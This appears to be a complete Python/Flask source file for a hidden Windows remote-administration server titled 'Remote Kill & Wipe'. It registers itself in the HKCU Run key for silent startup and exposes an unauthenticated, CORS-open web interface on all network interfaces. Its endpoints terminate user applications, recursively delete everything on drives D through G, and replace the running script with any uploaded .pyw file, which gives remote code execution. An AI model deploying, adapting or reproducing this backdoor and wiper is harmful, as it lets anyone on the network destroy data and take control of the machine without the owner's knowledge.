import os
import subprocess
import sys
import importlib
import time
from pathlib import Path
import winreg
def add_to_registry_run(name="FlaskServer", args=None):
    script_path = str(Path(sys.argv[0]).resolve())
    python_exe = Path(sys.executable)
    pythonw_exe = python_exe.with_name("pythonw.exe")
    cmd = f'"{pythonw_exe}" "{script_path}"'
    if args:
        cmd += " " + " ".join(args)
    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0,
            winreg.KEY_SET_VALUE
        )
        winreg.SetValueEx(key, name, 0, winreg.REG_SZ, cmd)
        winreg.CloseKey(key)
        print(f"Registry Run entry added: {name} -> {cmd}")
    except PermissionError as e:
        print("Permission error when writing registry:", e)
add_to_registry_run()
REQUIRED_LIBS = ["flask", "psutil", "shutil"]
doc = """
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width,initial-scale=1" />
    <title>Remote Kill & Wipe</title>
    <style>
      body {
        font-family: system-ui, -apple-system, Segoe UI, Roboto, Ubuntu,
          "Helvetica Neue", Arial;
        padding: 24px;
        background: #f6f8fb;
      }
      .card {
        background: white;
        padding: 20px;
        border-radius: 12px;
        box-shadow: 0 8px 24px rgba(16, 24, 40, 0.08);
        max-width: 720px;
        margin: 0 auto;
      }
      h1 {
        margin: 0 0 8px;
        font-size: 20px;
      }
      p {
        margin: 0 0 16px;
        color: #444;
      }
      label {
        display: block;
        margin-bottom: 8px;
        font-size: 13px;
      }
      select,
      input[type="text"],
      input[type="file"] {
        width: 100%;
        padding: 8px;
        border-radius: 8px;
        border: 1px solid #ddd;
        margin-bottom: 12px;
      }
      .row {
        display: flex;
        gap: 12px;
      }
      .row.wrap {
        flex-wrap: wrap;
      }
      button {
        flex: 1;
        padding: 12px;
        border-radius: 10px;
        border: 0;
        font-weight: 600;
        cursor: pointer;
      }
      .kill { background: #f7b267; }
      .wipe { background: #ef476f; color: white; }
      .ping { background: #4cc9f0; color: white; }
      .download { background: #90be6d; color: white; }
      .update { background: #f94144; color: white; }
      .status {
        margin-top: 12px;
        padding: 10px;
        border-radius: 8px;
        background: #f1f5f9;
        min-height: 36px;
      }
      small {
        display: block;
        margin-top: 8px;
        color: #666;
      }
    </style>
  </head>
  <body>
    <div class="card">
      <label for="processSelect">Select Process to Kill</label>
      <select id="processSelect">
        <option value="POWERPNT.EXE">PowerPoint</option>
        <option value="WINWORD.EXE">Word</option>
        <option value="EXCEL.EXE">Excel</option>
        <option value="MSEDGE.EXE">Microsoft Edge</option>
        <option value="CHROME.EXE">Google Chrome</option>
        <option value="CODE.EXE">VS CODE</option>
      </select>
      <label for="driveSelect">Select Drive to Wipe</label>
      <select id="driveSelect">
        <option value="D">D:</option>
        <option value="E">E:</option>
        <option value="F">F:</option>
        <option value="G">G:</option>
      </select>
      <label for="updateFile">Select .pyw file to update script</label>
      <input type="file" id="updateFile" accept=".pyw" />

      <div class="row wrap" style="margin-bottom:8px;">
        <button id="killBtn" class="kill">Kill (terminate apps)</button>
        <button id="wipeBtn" class="wipe">Wipe (erase drive)</button>
        <button id="pingBtn" class="ping">Ping Server</button>
        <button id="downloadBtn" class="download">Download Script (.pyw/.py)</button>
        <button id="updateBtn" class="update">Update Script</button>
      </div>
      <div class="status" id="status">Ready.</div>
    </div>

    <script>
      const killBtn = document.getElementById("killBtn");
      const wipeBtn = document.getElementById("wipeBtn");
      const pingBtn = document.getElementById("pingBtn");
      const downloadBtn = document.getElementById("downloadBtn");
      const updateBtn = document.getElementById("updateBtn");
      const updateFile = document.getElementById("updateFile");
      const status = document.getElementById("status");
      const processSelect = document.getElementById("processSelect");
      const driveSelect = document.getElementById("driveSelect");
      const base = window.location.origin;

      function setButtonsDisabled(v) {
        [killBtn, wipeBtn, pingBtn, downloadBtn, updateBtn].forEach(b => {
          b.disabled = v;
          b.style.opacity = v ? "0.6" : "1";
        });
      }

      async function callEndpoint(path, options={}) {
        const url = base.replace(/\/$/, "") + path;
        setButtonsDisabled(true);
        status.textContent = "Calling " + url + " ...";
        try {
          const resp = await fetch(url, options);
          const text = await resp.text();
          status.textContent = `Response: ${resp.status} - ${text}`;
          return { ok: resp.ok, status: resp.status, text };
        } catch (err) {
          status.textContent = "Network or CORS error: " + err.message;
          return null;
        } finally {
          setButtonsDisabled(false);
        }
      }

      killBtn.addEventListener("click", async () => {
        const processName = processSelect.value;
        await callEndpoint("/kill?process=" + encodeURIComponent(processName));
      });

      wipeBtn.addEventListener("click", async () => {
        const drive = driveSelect.value;
        await callEndpoint("/wipe?drive=" + encodeURIComponent(drive));
      });

      pingBtn.addEventListener("click", async () => {
        setButtonsDisabled(true);
        status.textContent = "Pinging server...";
        try {
          const resp = await fetch(base.replace(/\/$/, "") + "/ping");
          const txt = await resp.text();
          status.textContent = `Ping: ${resp.status} - ${txt}`;
        } catch (err) {
          status.textContent = "Ping failed: " + err.message;
        } finally {
          setButtonsDisabled(false);
        }
      });

      downloadBtn.addEventListener("click", async () => {
        setButtonsDisabled(true);
        status.textContent = "Preparing download...";
        try {
          const resp = await fetch(base.replace(/\/$/, "") + "/download");
          if (!resp.ok) {
            const text = await resp.text();
            status.textContent = `Download failed: ${resp.status} - ${text}`;
            return;
          }
          const blob = await resp.blob();
          const a = document.createElement("a");
          a.href = URL.createObjectURL(blob);
          a.download = "script_download.pyw";
          document.body.appendChild(a);
          a.click();
          a.remove();
          status.textContent = `Download started`;
        } catch (err) {
          status.textContent = "Download error: " + err.message;
        } finally {
          setButtonsDisabled(false);
        }
      });

      updateBtn.addEventListener("click", async () => {
        if (!updateFile.files.length) {
          status.textContent = "No file selected for update";
          return;
        }
        const file = updateFile.files[0];
        const formData = new FormData();
        formData.append("file", file);
        setButtonsDisabled(true);
        status.textContent = "Uploading update...";
        try {
          const resp = await fetch(base.replace(/\/$/, "") + "/update", {
            method: "POST",
            body: formData
          });
          const text = await resp.text();
          status.textContent = `Update response: ${resp.status} - ${text}`;
        } catch (err) {
          status.textContent = "Update error: " + err.message;
        } finally {
          setButtonsDisabled(false);
        }
      });
    </script>
  </body>
</html>
"""
def install_missing_libraries():
    re_run = False
    for lib in REQUIRED_LIBS:
        try:
            importlib.import_module(lib)
        except ImportError:
            print(f"[+] Installing missing library: {lib}")
            subprocess.check_call([sys.executable, "-m", "pip", "install", lib])
            re_run = True
    try:
        import pythoncom, pywintypes 
    except ImportError:
        print("[*] Running pywin32 post-install script...")
        subprocess.run([sys.executable, os.path.join(sys.exec_prefix, "Scripts", "pywin32_postinstall.py"), "-install"])
        re_run = True
    if re_run:
        print("[*] Restarting script to apply new modules...")
        time.sleep(2)
        try:
            # safer restart using quoted path
            cmd = [sys.executable] + sys.argv
            subprocess.Popen(cmd, creationflags=subprocess.CREATE_NEW_CONSOLE)
            sys.exit(0)
        except Exception as e:
            print(f"[!] Restart failed: {e}")
            sys.exit(1)
install_missing_libraries()
def cleanup_update_helper():
    script_dir = Path(__file__).parent
    helper_path = script_dir / "update_helper.py"
    if helper_path.exists():
        try:
            helper_path.unlink()
            print(f"Removed leftover updater: {helper_path}")
        except Exception as e:
            print(f"Failed to remove leftover updater: {e}")
cleanup_update_helper()
import shutil
import psutil
from flask import Flask, request, send_file
from flask_cors import CORS
app = Flask(__name__)
CORS(app)
@app.route("/ping")
def ping():
    return "Server is active"
@app.route("/wipe")
def wipe():
    drive = request.args.get("drive", "E")
    path = f"{drive}:/"
    if not os.path.exists(path):
        return "Unsuccessful"
    for item in os.listdir(path):
        item_path = os.path.join(path, item)
        try:
            if os.path.isfile(item_path) or os.path.islink(item_path):
                os.remove(item_path)
            elif os.path.isdir(item_path):
                shutil.rmtree(item_path)
        except Exception as e:
            return f"Error: {e}"
    return f"Successful wipe of {drive}: drive"
@app.route("/kill")
def kill():
    SAFE_TO_KILL = {
        "POWERPNT.EXE",
        "WINWORD.EXE",
        "EXCEL.EXE",
        "MSEDGE.EXE",
        "CHROME.EXE",
        "CODE.EXE"
    }
    process_to_kill = request.args.get("process", "").upper()
    if process_to_kill not in SAFE_TO_KILL:
        return "Invalid or unsafe process"
    flag = False
    for p in psutil.process_iter(['pid', 'name']):
        if p.info['name'] and p.info['name'].upper() == process_to_kill:
            p.terminate()
            p.wait(5)
            flag = True
    return "Successfully killed " + process_to_kill if flag else "Unsuccessful"
@app.route("/download")
def download():
    try:
        script_path = os.path.abspath(sys.argv[0])
        if script_path.endswith(".py"):
            pyw_path = script_path[:-3] + ".pyw"
            if os.path.exists(pyw_path):
                script_path = pyw_path
        if not os.path.exists(script_path):
            return "Script file not found"
        return send_file(script_path, as_attachment=True)
    except Exception as e:
        return f"Error sending file: {e}"
@app.route("/update", methods=["POST"])
def update():
    if "file" not in request.files:
        return "No file uploaded", 400
    uploaded_file = request.files["file"]
    if not uploaded_file.filename.lower().endswith(".pyw"):
        return "Only .pyw files are allowed", 400
    try:
        current_script = os.path.abspath(sys.argv[0])
        dir_path = os.path.dirname(current_script)
        original_name = os.path.basename(current_script)
        temp_path = os.path.join(dir_path, "temp_update.pyw")
        uploaded_file.save(temp_path)
        pythonw_exe = Path(sys.executable).with_name("pythonw.exe")
        helper_code = f"""
import time, os, sys, subprocess
time.sleep(2)
os.replace(r"{temp_path}", r"{current_script}")
subprocess.Popen([r"{pythonw_exe}", r"{current_script}"])
"""
        helper_path = os.path.join(dir_path, "update_helper.py")
        with open(helper_path, "w") as f:
            f.write(helper_code)
        subprocess.Popen([sys.executable, helper_path])
        return "Update started. Server will restart shortly...", 200
    except Exception as e:
        return f"Error updating script: {e}", 500
@app.route("/")
def home():
    return doc
if __name__ == "__main__":
    app.run(debug=True, host="0.0.0.0")